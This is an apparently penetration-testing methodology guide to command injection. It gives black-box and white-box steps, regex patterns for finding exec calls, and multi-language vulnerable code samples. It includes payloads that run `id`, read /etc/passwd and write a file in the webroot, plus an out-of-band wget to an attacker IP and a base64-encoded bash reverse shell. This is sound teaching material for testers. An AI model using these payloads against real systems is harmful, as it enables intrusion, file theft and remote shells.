# Command Injection

## Check List

## Methodology

### Black Box

#### [Reflected Command Injection In an Embedded Cloud Shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/Intruder/command_exec.txt)

{% stepper %}
{% step %}
When a web application includes a terminal, shell, or IDE interface (Cloud Shell, Dev Console, Admin Terminal), test URL parameters (project, env, config) for command injection.
{% endstep %}

{% step %}
Access the cloud console or developer environment and identify a terminal or shell interface (`via ?show=ide,terminal, ?mode=console,` or a "`Terminal`" tab)
{% endstep %}

{% step %}
Locate a configurable parameter (`project`, `env`, `workspace`, `config`) in the URL that influences the terminal session or backend configuration and Change `?project=test` and observe the terminal prompt or project name update
{% endstep %}

{% step %}
Switch to a minimal or IDE-only view (`show=ide`, `view=code`) where the parameter is likely processed in a script (`Python`, `Node.js`, `etc.`)
{% endstep %}

{% step %}
inject a single quote (`'`) into the parameter and reload; if a script syntax error appears in the terminal (`SyntaxError`, `unexpected token`), it confirms direct reflection without encoding
{% endstep %}

{% step %}
Use **syntax closure** to neutralize the original code

* If reflection is in `if 'value':`, close with `':#` to comment out the rest
* If multi-line, use triple quotes: `''';` to close strings. Set `project=asd':#` or `project=asd''';print(''` to fix syntax and gain control
{% endstep %}

{% step %}
inject `project=asd''';import os;os.system("id");print(''` , Reload and check terminal output for `uid=....`
{% endstep %}
{% endstepper %}

***

#### [Language Parameter](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/Intruder/command-execution-unix.txt)

{% stepper %}
{% step %}
Log in to the target site
{% endstep %}

{% step %}
Then use the burp suite tool to inspect the requests and identify the endpoints
{% endstep %}

{% step %}
Then, check in the identified endpoints whether there is a parameter called `language=` or a parameter that specifies the language
{% endstep %}

{% step %}
Then send the request to the repeater and replace the language parameter value with the following content and if the send method was `GET`, change it to `POST`

```bash
{${system("cat+/etc/passwd"J)}}
```
{% endstep %}

{% step %}
Send the request and then check whether the server's response shows the sensitive file content
{% endstep %}
{% endstepper %}

***

### White Box

#### OS Command Injection in Filename

{% stepper %}
{% step %}
Identify the target product and inspect files related to modules responsible for file management, media handling, audio recording, format conversion, or user data processing
{% endstep %}

{% step %}
Identify all AJAX endpoints, APIs, or forms through which authenticated users can submit filenames, file paths, or other file-related parameters
{% endstep %}

{% step %}
Identify parameters whose values are directly received from user requests (such as `file`, `filename`, `path`, `name`, and similar arrays)
{% endstep %}

{% step %}
Trace the data flow of each parameter from the request entry point to its usage location in the code
{% endstep %}

{% step %}
Search the source code for functions that execute operating system commands, such as `exec`, `system`, `shell_exec`, `popen`, `proc_open`, or their equivalents in other languages

**VSCode (Regex Detection)**

{% tabs %}
{% tab title="C#" %}
```regexp
(ProcessStartInfo)|(Process\.Start)|(cmd\.exe)|(powershell\.exe)
```
{% endtab %}

{% tab title="Java" %}
```regexp
(Runtime\.getRuntime\(\)\.exec)|(ProcessBuilder\s*\()|(getParameter\s*\()
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(\$_(GET|POST|REQUEST|FILES))|(exec\s*\()|(shell_exec\s*\()|(system\s*\()|(passthru\s*\()|(popen\s*\()
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(child_process)|(exec\s*\()|(spawn\s*\()|(execSync\s*\()
```
{% endtab %}
{% endtabs %}

**RipGrep (Regex Detection(Linux))**

{% tabs %}
{% tab title="C#" %}
```regexp
ProcessStartInfo|Process\.Start|cmd\.exe|powershell\.exe
```
{% endtab %}

{% tab title="Java" %}
```regexp
Runtime\.getRuntime\(\)\.exec|ProcessBuilder\s*\(|getParameter\s*\(
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$_(GET|POST|REQUEST|FILES)|exec\s*\(|shell_exec\s*\(|system\s*\(|passthru\s*\(|popen\s*\(
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
child_process|exec\s*\(|spawn\s*\(|execSync\s*\(
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public void fixeRIFF(string filename){
        string[] out;
        int ret;
        exec("file -b " + filename + " | grep 'RIFF' ", out, ret);
        if(ret == 0 ){
                dbug(_("An error is occured on RIFF detection."));
        }
        if(string.IsNullOrEmpty(out[0])){
                string f;
                if (Request.Form["name"] != null && Request.Form["name"].StartsWith("custom/")) {
                        f = Request.Form["name"].Replace("custom/", "");
                } else {
                        f = Request.Form["file"].Replace("custom/", "");
                }
                string cmd = "mv " + this.temp + "/" + f + ".wav " + filename;
                exec(cmd, out, ret);
        }
}
```
{% endtab %}

{% tab title="Java" %}
```java
public void fixeRIFF(String filename){
        String[] out;
        int ret;
        exec("file -b " + filename + " | grep 'RIFF' ", out, ret);
        if(ret == 0 ){
                dbug(_("An error is occured on RIFF detection."));
        }
        if(out[0].isEmpty()){
                String f;
                if (request.getParameter("name") != null && request.getParameter("name").startsWith("custom/")) {
                        f = request.getParameter("name").replace("custom/", "");
                } else {
                        f = request.getParameter("file").replace("custom/", "");
                }
                String cmd = "mv " + this.temp + "/" + f + ".wav " + filename;
                exec(cmd, out, ret);
        }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
public function fixeRIFF($filename){
        exec("file -b $filename | grep 'RIFF' ", $out, $ret);
        if($ret === 0 ){
                dbug(_("An error is occured on RIFF detection."));
        }
        if(empty($out[0])){
                if (isset($_POST["name"]) && str_starts_with($_POST["name"], "custom/")) {
                        $f = str_replace("custom/", "", $_POST["name"]);
                } else {
                        $f = str_replace("custom/", "", $_POST["file"]);
                }
                $cmd = "mv ".$this->temp."/$f.wav $filename";
                exec($cmd, $out, $ret);
        }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
function fixeRIFF(filename){
        exec("file -b " + filename + " | grep 'RIFF' ", out, ret);
        if(ret === 0 ){
                dbug(_("An error is occured on RIFF detection."));
        }
        if(!out[0]){
                let f;
                if (req.body.name && req.body.name.startsWith("custom/")) {
                        f = req.body.name.replace("custom/", "");
                } else {
                        f = req.body.file.replace("custom/", "");
                }
                let cmd = "mv " + this.temp + "/" + f + ".wav " + filename;
                exec(cmd, out, ret);
        }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Check whether user-controlled input is inserted into operating system commands without proper validation, filtering, or escaping
{% endstep %}

{% step %}
Check whether the input value can contain special shell characters such as `;`, `&&`, `|`, `` ` ``, `$()`, or similar characters
{% endstep %}

{% step %}
In one of the controllable parameters, place a filename along with a command separator character and a simple harmless command
{% endstep %}

{% step %}
Send the request and verify whether the injected command has been executed on the system

```http
POST /admin/ajax.php HTTP/1.1
Host: target
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<valid-session>

file=dummy.wav;`touch /var/www/html/pawned`&language=en&temporary[en]=0&filenames[en]=dummy.wav&command=gethtml5&module=recordings
```
{% endstep %}
{% endstepper %}

***

#### Unsanitized Administrative Configuration Parameters Leading to Remote Code Execution

{% stepper %}
{% step %}
Identify the target product and inspect modules that provide administrative operations, service restart functionality, Poller management, Broker management, Agent management, or system configuration processing
{% endstep %}

{% step %}
Locate the backend files related to these functionalities and identify the paths that process administrative panel requests
{% endstep %}

{% step %}
Trace the complete data flow from the administrative interface to the point where the command is executed on the operating system
{% endstep %}

{% step %}
Search the source code for operating system command execution functions such as `shell_exec`, `exec`, `system`, `popen`, or their equivalents

**VSCode (Regex Detection)**

{% tabs %}
{% tab title="C#" %}
```regexp
(ProcessStartInfo)|(Process\.Start)|(cmd\.exe)|(powershell\.exe)
```
{% endtab %}

{% tab title="Java" %}
```regexp
(Runtime\.getRuntime\(\)\.exec)|(ProcessBuilder\s*\()|(getParameter\s*\()
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(\$_(GET|POST|REQUEST|FILES))|(exec\s*\()|(shell_exec\s*\()|(system\s*\()|(passthru\s*\()|(popen\s*\()
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(child_process)|(exec\s*\()|(spawn\s*\()|(execSync\s*\()
```
{% endtab %}
{% endtabs %}

**RipGrep (Regex Detection(Linux))**

{% tabs %}
{% tab title="C#" %}
```regexp
ProcessStartInfo|Process\.Start|cmd\.exe|powershell\.exe
```
{% endtab %}

{% tab title="Java" %}
```regexp
Runtime\.getRuntime\(\)\.exec|ProcessBuilder\s*\(|getParameter\s*\(
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$_(GET|POST|REQUEST|FILES)|exec\s*\(|shell_exec\s*\(|system\s*\(|passthru\s*\(|popen\s*\(
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
child_process|exec\s*\(|spawn\s*\(|execSync\s*\(
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
void Reload()
{
    if ((command = this.GetReloadCommand()) != null) {
     // vulnerable code !!!   
     System.Diagnostics.Process.Start("sudo " + command);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
void reload()
{
    if ((command = this.getReloadCommand()) != null) {
     // vulnerable code !!!   
     Runtime.getRuntime().exec("sudo " + command);
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
function reload()
{
   if ($command = $this->getReloadCommand()) {
   // vulnerable code !!!
   shell_exec("sudo " . $command);
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
const { exec } = require('child_process');

function reload()
{
    if (command = this.getReloadCommand()) {
     // vulnerable code !!!   
     exec("sudo " + command);
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Check whether values received from the database, administrative settings, or user requests are directly inserted into shell commands

{% tabs %}
{% tab title="C#" %}
```csharp
private string GetReloadCommand()
{
    string command = null;

    var result = this.db.Query(
        "SELECT broker_reload_command " +
        "FROM nagios_server " +
        "ORDER BY localhost DESC"
    );

    if ((row = result.Fetch()) != null) {
        command = row["broker_reload_command"];
    }

    return command;
}
```
{% endtab %}

{% tab title="Java" %}
```java
private String getReloadCommand()
{
    String command = null;

    var result = this.db.query(
        "SELECT broker_reload_command " +
        "FROM nagios_server " +
        "ORDER BY localhost DESC"
    );

    if ((row = result.fetch()) != null) {
        command = row["broker_reload_command"];
    }

    return command;
}
```
{% endtab %}

{% tab title="PHP" %}
```php
private function getReloadCommand(): ?string
{
    $command = null;

    $result = $this->db->query(
        'SELECT broker_reload_command
        FROM nagios_server
        ORDER BY localhost DESC'
    );

if ($row = $result->fetch()) {
        $command = $row['broker_reload_command'];
    }

return $command;
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
function getReloadCommand()
{
    let command = null;

    let result = this.db.query(
        'SELECT broker_reload_command ' +
        'FROM nagios_server ' +
        'ORDER BY localhost DESC'
    );

    if (row = result.fetch()) {
        command = row['broker_reload_command'];
    }

    return command;
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Then verify whether input validation or filtering is absent. Set up a local server and send the request using the system command `wget http://<attacker_ip>` in the input
{% endstep %}
{% endstepper %}

***

#### Command Injection via Misconfigured Chromium Binary Path in Administrative PDF Generation Feature

{% stepper %}
{% step %}
Identify the target website or product and log in with an administrator account.
{% endstep %}

{% step %}
Enter the application’s administrative panel and locate the system configuration paths `(Setup / Configuration)` that include parameters related to external tools
{% endstep %}

{% step %}
Then, within the setup or administrative paths, look for parameters and inputs that store tool execution paths (such as `chromium_path`, `binary_path`, or similar)
{% endstep %}

{% step %}
In the server-side code, find the files that use this value and look for the use of system execution functions such as `exec()`
{% endstep %}

{% step %}
Check whether the value read from the configuration is properly sanitized or escaped before being passed to `exec()`

**VSCode (Regex Detection)**

{% tabs %}
{% tab title="C#" %}
```regexp
(ProcessStartInfo)|(Process\.Start)|(cmd\.exe)|(powershell\.exe)
```
{% endtab %}

{% tab title="Java" %}
```regexp
(Runtime\.getRuntime\(\)\.exec)|(ProcessBuilder\s*\()|(getParameter\s*\()
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(\$_(GET|POST|REQUEST|FILES))|(exec\s*\()|(shell_exec\s*\()|(system\s*\()|(passthru\s*\()|(popen\s*\()
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(child_process)|(exec\s*\()|(spawn\s*\()|(execSync\s*\()
```
{% endtab %}
{% endtabs %}

**RipGrep (Regex Detection(Linux))**

{% tabs %}
{% tab title="C#" %}
```regexp
ProcessStartInfo|Process\.Start|cmd\.exe|powershell\.exe
```
{% endtab %}

{% tab title="Java" %}
```regexp
Runtime\.getRuntime\(\)\.exec|ProcessBuilder\s*\(|getParameter\s*\(
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$_(GET|POST|REQUEST|FILES)|exec\s*\(|shell_exec\s*\(|system\s*\(|passthru\s*\(|popen\s*\(
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
child_process|exec\s*\(|spawn\s*\(|execSync\s*\(
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
// /var/www/html/pandoraitsm/include/functions.php
// Function Name is generatePDF()
string chromium_dir = io_safe_output(config["chromium_path"]);
var result_ejecution = System.Diagnostics.Process.Start(chromium_dir + " --version");

if (string.IsNullOrEmpty(result_ejecution.ToString()) == true) {
    if (params["return_img_base_64"]) {
        params["base64"] = true;
        
-----------------------------------------------------------------------------------
public void GeneratePDF(
    List<object> items,
    Dictionary<string, object> options = null,
    Dictionary<string, object> optionsPDF = null
)
{
    var config = Global.config;

    // If not install chromium avoid 500 convert tu images no data to show.
    string chromium_dir = io_safe_output(config["chromium_path"]);
    var result_ejecution = System.Diagnostics.Process.Start(chromium_dir + " --version");

    if (string.IsNullOrEmpty(result_ejecution.ToString()) == true)
    {
        string message_error = __("chromium is not installed") + ", ";
        message_error += __("To be able to create images of the graphs for PDFs, please install the chromium extension.");
        message_error += "<a href=\"https://www.chromium.org/getting-involved/download-chromium/\" target=\"_blank\">";
        message_error += __("Info chromium");
        message_error += "</a>";

        throw new ArgumentException(message_error);
        return;
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
// /var/www/html/pandoraitsm/include/functions.php
// Function Name is generatePDF()
String chromium_dir = io_safe_output(config.get("chromium_path"));
String result_ejecution = Runtime.getRuntime().exec(chromium_dir + " --version").toString();

if (result_ejecution.isEmpty() == true) {
    if (params.get("return_img_base_64")) {
        params.put("base64", true);
--------------------------------------------------------------------------------------------

// Begin vulnerable code section
public void generatePDF(
    List<Object> items,
    Map<String, Object> options,
    Map<String, Object> optionsPDF
) {
    Map<String, Object> config = Global.config;

    // If not install chromium avoid 500 convert tu images no data to show.
    String chromium_dir = io_safe_output((String) config.get("chromium_path"));
    String result_ejecution = Runtime.getRuntime()
        .exec(chromium_dir + " --version")
        .toString();

    if (result_ejecution.isEmpty() == true) {
        String message_error = __("chromium is not installed") + ", ";
        message_error += __("To be able to create images of the graphs for PDFs, please install the chromium extension.");
        message_error += "<a href=\"https://www.chromium.org/getting-involved/download-chromium/\" target=\"_blank\">";
        message_error += __("Info chromium");
        message_error += "</a>";

        throw new IllegalArgumentException(message_error);
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
// /var/www/html/pandoraitsm/include/functions.php
// Function Name is generatePDF()
$chromium_dir = io_safe_output($config['chromium_path']);
$result_ejecution = exec($chromium_dir.' --version');
if (empty($result_ejecution) === true) {
    if ($params['return_img_base_64']) {
        $params['base64'] = true;
-------------------------------------------------------------

// Begin vulnerable code section
public function generatePDF(
    array $items,
    ?array $options = [],
    ?array $optionsPDF = null
) {
    global $config;

    // If not install chromium avoid 500 convert tu images no data to show.
    $chromium_dir = io_safe_output($config['chromium_path']);
    $result_ejecution = exec($chromium_dir.' --version');
    if (empty($result_ejecution) === true) {
        $message_error = __('chromium is not installed').', ';
        $message_error .= __('To be able to create images of the graphs for PDFs, please install the chromium extension.');
        $message_error .= '<a href="https://www.chromium.org/getting-involved/download-chromium/" target="_blank">';
        $message_error .= __('Info chromium');
        $message_error .= '</a>';

        throw new InvalidArgumentException($message_error);
        return;
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
// /var/www/html/pandoraitsm/include/functions.php
// Function Name is generatePDF()
const chromium_dir = io_safe_output(config.chromium_path);
const { execSync } = require('child_process');

const result_ejecution = execSync(chromium_dir + " --version").toString();

if (result_ejecution.length === 0 === true) {
    if (params["return_img_base_64"]) {
        params["base64"] = true;

---------------------------------------------------------------------------

// Begin vulnerable code section
function generatePDF(
    items,
    options = {},
    optionsPDF = null
) {
    const config = global.config;

    // If not install chromium avoid 500 convert tu images no data to show.
    const chromium_dir = io_safe_output(config.chromium_path);
    const { execSync } = require('child_process');

    const result_ejecution = execSync(chromium_dir + " --version").toString();

    if (result_ejecution.length === 0 === true) {
        let message_error = __("chromium is not installed") + ", ";
        message_error += __("To be able to create images of the graphs for PDFs, please install the chromium extension.");
        message_error += "<a href=\"https://www.chromium.org/getting-involved/download-chromium/\" target=\"_blank\">";
        message_error += __("Info chromium");
        message_error += "</a>";

        throw new Error(message_error);
        return;
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Important note: **this vulnerability occurs when a report is created and then exported to PDF, and the report must be of chart type to be exported to PDF. In this case, the execution path of the user input, which is `chromium_path`, reaches the `exec` function**
{% endstep %}
{% endstepper %}

***

#### Command Injection via Backup Filename

{% stepper %}
{% step %}
Identify the target product, then locate Backup, Restore, Export, or filesystem operation modules in the administrative panel
{% endstep %}

{% step %}
Find the paths where the user can enter the filename, backup name, storage path, or similar values
{% endstep %}

{% step %}
In the source code, locate the files related to the Backup functionality and inspect the main backup creation functions
{% endstep %}

{% step %}
Trace the user input flow in the source code until the backup filename processing stage, and at the processing point look for the use of system functions

**VSCode (Regex Detection)**

{% tabs %}
{% tab title="C#" %}
```regexp
(ProcessStartInfo)|(Process\.Start)|(cmd\.exe)|(powershell\.exe)
```
{% endtab %}

{% tab title="Java" %}
```regexp
(Runtime\.getRuntime\(\)\.exec)|(ProcessBuilder\s*\()|(getParameter\s*\()
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(\$_(GET|POST|REQUEST|FILES))|(exec\s*\()|(shell_exec\s*\()|(system\s*\()|(passthru\s*\()|(popen\s*\()
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(child_process)|(exec\s*\()|(spawn\s*\()|(execSync\s*\()
```
{% endtab %}
{% endtabs %}

**RipGrep (Regex Detection(Linux))**

{% tabs %}
{% tab title="C#" %}
```regexp
ProcessStartInfo|Process\.Start|cmd\.exe|powershell\.exe
```
{% endtab %}

{% tab title="Java" %}
```regexp
Runtime\.getRuntime\(\)\.exec|ProcessBuilder\s*\(|getParameter\s*\(
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$_(GET|POST|REQUEST|FILES)|exec\s*\(|shell_exec\s*\(|system\s*\(|passthru\s*\(|popen\s*\(
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
child_process|exec\s*\(|spawn\s*\(|execSync\s*\(
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
// begin vulnerable code section
public void CreateBackup(string name, int mode, ref string real_name, bool from_programming = false) {
    var config = Global.config;

    var time = DateTime.Now;
    string formatted_time = time.ToString("dd-MM-yy-hh-mm-ss");

    if (real_name == "") {
        string name_without_blank = safe_output(name).Replace(" ", "_space_");
        //real_name = "IntegriaBackup---" + 0 + "---" + mode + "---" + name_without_blank + "---" + MD5(rand(1000, 1000000000)).Substring(10) + "---" + formatted_time;
        real_name = "IB---" + 0 + "---" + mode + "---" + name_without_blank + "---" + formatted_time;
    }

    string sqlfile = "";
    string attachmentsfile = "";

    switch (mode) {
        case 0:
            sqlfile = "db_backup_" + real_name + ".sql";
            break;

        case 1:
            attachmentsfile = BACKUP_FULLPATH + "/" + "attachments_backup_" + real_name + "/";
            System.IO.Directory.CreateDirectory(attachmentsfile);
            break;

        case 2:
            sqlfile = "db_backup_" + real_name + ".sql";

            attachmentsfile = BACKUP_FULLPATH + "/" + "attachments_backup_" + real_name + "/";
            System.IO.Directory.CreateDirectory(attachmentsfile);
            break;
    }

    string uname = System.Runtime.InteropServices.RuntimeInformation.OSDescription;
    bool so_win = System.Text.RegularExpressions.Regex.IsMatch(uname, "(.)*Windows(.)*", System.Text.RegularExpressions.RegexOptions.IgnoreCase);

    string command_copy;

    if (so_win) {
        config["homedir"] = config["homedir"].Replace("/", "\\");
        command_copy = string.Format("xcopy " + config["homedir"] + "attachment\\* {0} ", attachmentsfile);
    }
    else {
        command_copy = string.Format("cp -r " + config["homedir"] + "attachment/* {0} ", attachmentsfile);
    }

    bool process = true;

    if (sqlfile != "") {
        string command;

        if (config["dbpass"] == "") {
            command = string.Format("mysqldump -h {0} -u {1} {2} > {3} ",
                config["dbhost"],
                config["dbuser"],
                config["dbname"],
                sqlfile);
        } else {
            command = string.Format("mysqldump -h {0} -u {1} -p{2} {3} > {4} ",
                config["dbhost"],
                config["dbuser"],
                config["dbpass"],
                config["dbname"],
                sqlfile);
        }

        // this is where the actual RCE gets executed
        System.Diagnostics.Process.Start(command);
    }

    // this is where the actual RCE gets executed
    if (attachmentsfile != "") {
        var result = System.Diagnostics.Process.Start(command_copy);
    }
}
// end vulnerable code section
```
{% endtab %}

{% tab title="Java" %}
<pre class="language-java"><code class="lang-java">// begin vulnerable code section
<strong>public void create_backup(String name, int mode, String[] real_name, boolean from_programming) {
</strong>    var config = Global.config;

    var time = java.time.LocalDateTime.now();
    String formatted_time = time.format(java.time.format.DateTimeFormatter.ofPattern("dd-MM-yy-hh-mm-ss"));

    if (real_name[0].equals("")) {
        String name_without_blank = safe_output(name).replace(" ", "_space_");
        //real_name[0] = "IntegriaBackup---" + 0 + "---" + mode + "---" + name_without_blank + "---" + MD5(rand(1000, 1000000000)).substring(10) + "---" + formatted_time;
        real_name[0] = "IB---" + 0 + "---" + mode + "---" + name_without_blank + "---" + formatted_time;
    }

    String sqlfile = "";
    String attachmentsfile = "";

    switch (mode) {
        case 0:
            sqlfile = "db_backup_" + real_name[0] + ".sql";
            break;

        case 1:
            attachmentsfile = BACKUP_FULLPATH + "/" + "attachments_backup_" + real_name[0] + "/";
            new java.io.File(attachmentsfile).mkdir();
            break;

        case 2:
            sqlfile = "db_backup_" + real_name[0] + ".sql";

            attachmentsfile = BACKUP_FULLPATH + "/" + "attachments_backup_" + real_name[0] + "/";
            new java.io.File(attachmentsfile).mkdir();
            break;
    }

    String uname = System.getProperty("os.name");
    boolean so_win = uname.matches("(.)*Windows(.)*");

    String command_copy;

    if (so_win) {
        config.put("homedir", config.get("homedir").replace("/", "\\\\"));
        command_copy = String.format("xcopy " + config.get("homedir") + "attachment\\* %s ", attachmentsfile);
    }
    else {
        command_copy = String.format("cp -r " + config.get("homedir") + "attachment/* %s ", attachmentsfile);
    }

    boolean process = true;

    if (!sqlfile.equals("")) {
        String command;

        if (config.get("dbpass").equals("")) {
            command = String.format("mysqldump -h %s -u %s %s > %s ",
                config.get("dbhost"),
                config.get("dbuser"),
                config.get("dbname"),
                sqlfile);
        } else {
            command = String.format("mysqldump -h %s -u %s -p%s %s > %s ",
                config.get("dbhost"),
                config.get("dbuser"),
                config.get("dbpass"),
                config.get("dbname"),
                sqlfile);
        }

        // this is where the actual RCE gets executed
        Runtime.getRuntime().exec(command);
    }

    // this is where the actual RCE gets executed
    if (!attachmentsfile.equals("")) {
        Process result = Runtime.getRuntime().exec(command_copy);
    }
}
// end vulnerable code section
</code></pre>
{% endtab %}

{% tab title="PHP" %}
```php
// begin vulnerable code section
function create_backup ($name, $mode, &$real_name, $from_programming = false) {
        global $config;

        $time = new DateTime('now');
        $time = $time->format("d-m-y-h-i-s");

        if ($real_name == "") {
                $name_without_blank = str_replace(" ", "_space_", safe_output($name));
                //$real_name = "IntegriaBackup---" . 0 . "---" . $mode . "---" . $name_without_blank . "---" . substr(MD5(rand(1000, 1000000000)), 10) . "---" . $time;
                $real_name = "IB---" . 0 . "---" . $mode . "---" . $name_without_blank. "---". $time;
        }

        $sqlfile = "";
        $attachmentsfile = "";

        switch ($mode) {
                case 0:
                        $sqlfile = "db_backup_" . $real_name . ".sql";
                        break;

                case 1:
                        $attachmentsfile = BACKUP_FULLPATH . '/' . "attachments_backup_" . $real_name . "/";
                        mkdir($attachmentsfile);
                        break;

                case 2:
                        $sqlfile = "db_backup_" . $real_name . ".sql";

                        $attachmentsfile = BACKUP_FULLPATH . '/' . "attachments_backup_" . $real_name . "/";
                        mkdir($attachmentsfile);
                        break;
        }

        $uname = php_uname();
        $so_win = preg_match("/(.)*Windows(.)*/i",$uname);

        if ($so_win) {
                $config['homedir'] = str_replace("/", "\\", $$config['homedir']);
                $command_copy = sprintf ('xcopy ' . $config['homedir'] . 'attachment\* %s ', $attachmentsfile);
        }
        else {
                $command_copy = sprintf ('cp -r ' . $config['homedir'] . 'attachment/* %s ', $attachmentsfile);
        }

        $process = true;

        if ($sqlfile != "") {
                if ($config["dbpass"] == "") {
                        $command = sprintf ('mysqldump -h %s -u %s %s > %s ', $config['dbhost'], $config['dbuser'], $config['dbname'],$sqlfile);
                } else {
                        $command = sprintf ('mysqldump -h %s -u %s -p%s %s > %s ',$config['dbhost'], $config['dbuser'],$config['dbpass'], $config['dbname'],$sqlfile);
                }

                // this is where the actual RCE gets executed
                exec($command);
        }

        // this is where the actual RCE gets executed
        if ($attachmentsfile != "") {
                $result = exec($command_copy);
        }
}
// end vulnerable code section
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
// begin vulnerable code section
const { execSync } = require('child_process');

function create_backup(name, mode, real_name, from_programming = false) {
        const config = global.config;

        let time = new Date();

        let formatted_time =
            time.getDate() + "-" +
            (time.getMonth() + 1) + "-" +
            time.getFullYear().toString().slice(-2) + "-" +
            time.getHours() + "-" +
            time.getMinutes() + "-" +
            time.getSeconds();

        if (real_name == "") {
                let name_without_blank = safe_output(name).replace(/ /g, "_space_");
                //real_name = "IntegriaBackup---" + 0 + "---" + mode + "---" + name_without_blank + "---" + MD5(rand(1000, 1000000000)).substr(10) + "---" + formatted_time;
                real_name = "IB---" + 0 + "---" + mode + "---" + name_without_blank + "---" + formatted_time;
        }

        let sqlfile = "";
        let attachmentsfile = "";

        switch (mode) {
                case 0:
                        sqlfile = "db_backup_" + real_name + ".sql";
                        break;

                case 1:
                        attachmentsfile = BACKUP_FULLPATH + '/' + "attachments_backup_" + real_name + "/";
                        require('fs').mkdirSync(attachmentsfile);
                        break;

                case 2:
                        sqlfile = "db_backup_" + real_name + ".sql";

                        attachmentsfile = BACKUP_FULLPATH + '/' + "attachments_backup_" + real_name + "/";
                        require('fs').mkdirSync(attachmentsfile);
                        break;
        }

        let uname = process.platform;
        let so_win = /(.)*Windows(.)*/i.test(uname);

        let command_copy;

        if (so_win) {
                config['homedir'] = config['homedir'].replace(/\//g, "\\");
                command_copy = `xcopy ${config['homedir']}attachment\\* ${attachmentsfile} `;
        }
        else {
                command_copy = `cp -r ${config['homedir']}attachment/* ${attachmentsfile} `;
        }

        let process_exec = true;

        if (sqlfile != "") {
                let command;

                if (config["dbpass"] == "") {
                        command = `mysqldump -h ${config['dbhost']} -u ${config['dbuser']} ${config['dbname']} > ${sqlfile} `;
                } else {
                        command = `mysqldump -h ${config['dbhost']} -u ${config['dbuser']} -p${config['dbpass']} ${config['dbname']} > ${sqlfile} `;
                }

                // this is where the actual RCE gets executed
                execSync(command);
        }

        // this is where the actual RCE gets executed
        if (attachmentsfile != "") {
                let result = execSync(command_copy);
        }
}
// end vulnerable code section
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
If restrictions exist, test bypass methods such as `${IFS}`, Base64 Encoding, or Command Chaining

```bash
echo -n "bash -i >& /dev/tcp/192.168.201.8/4444 0>&1"|base64 -w0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwMS44LzQ0NDQgMD4mMQ==
```
{% endstep %}

{% step %}
Then send the request, and if a request is made to your server, the vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

#### Command Execution via Exposed Administrative API Endpoint

{% stepper %}
{% step %}
Identify files related to API Mapping or Servlet Configuration (such as XML config files or `.config` files)

```xml
<api id="com.hp.ci.mgmt.guidpools.controllers.PoolController.executeCommand(HttpServletRequest,HttpServletResponse,ExecutableCommand,String,String,String)" method="PUT" uri="/rest/id-pools/executeCommand" internal-uri="/guidapp/rest/id-pools/executeCommand" public="false" no-cli="false" input-dto="com.hp.ci.mgmt.guidpools.guidserver.dto.ExecutableCommand" output-dto="com.hp.ci.mgmt.guidpools.guidserver.dto.ExecutableCommand">
                    <requestHeader default="en_US" required="true" dto="java.lang.String" name="Accept-Language">
                        <description default="true">
            The language code requested in the response. If a suitable match to
            the requested language is not available, en-US or the appliance locale is used.
        </description>
                    </requestHeader>
                    <requestHeader required="false" dto="java.lang.String" name="Auth">
                        <description default="true">
            Session authorization token obtained from <a href="rest:resource:/rest/login-sessions">logging in</a>.  If this header is
            not included or if the session-token is invalid, the response code will be 401 Unauthorized.
        </description>
                    </requestHeader>
                    <requestHeader required="true" dto="java.lang.String" name="Content-Type" required-value="application/json">
                        <description default="true">
            The data format sent in the request body. If the Content-Type header is not provided, application/octet-stream
            is assumed. Any value other than the required value will result in a response code of 415 Unsupported Media Type.
        </description>
                    </requestHeader>
                    <requestHeader required="false" dto="java.lang.String" name="If-None-Match">
                        <description default="true">
            The request is conditionally processed only if the current ETag for the resource does not match the ETag passed in this
            header. If the ETag specified in this header matches the resource's current ETag, the status code returned from the GET
            will be 304 Not Modified.
        </description>
                    </requestHeader>
                    <authInfo auth-type="NO_AUTH">
                        <description default="true">
            This API requires no authorization.
        </description>
                    </authInfo>
                </api>
```
{% endstep %}

{% step %}
Review the file and look for endpoints or API routes in the application configuration that perform system command execution (such as `executeCommand`)
{% endstep %}

